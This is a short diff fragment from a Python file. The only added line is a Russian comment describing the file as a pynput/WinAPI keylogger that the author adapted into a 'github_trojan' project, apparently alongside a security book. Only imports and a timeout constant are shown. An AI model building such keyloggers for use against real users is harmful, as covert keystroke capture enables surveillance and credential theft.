@@ -4,7 +4,7 @@ import sys
 import time
 from pynput.keyboard import Listener, Key, KeyCode
 import sys
-
+# этот код не язвяется частью книги. это кейлоггер написаный при помощи winAPI и pynput из за проблем с pywinhook я его полностью заменил и адаптировал в github_trojan
 TIMEOUT = 60 * 10
 pressed = set()
 
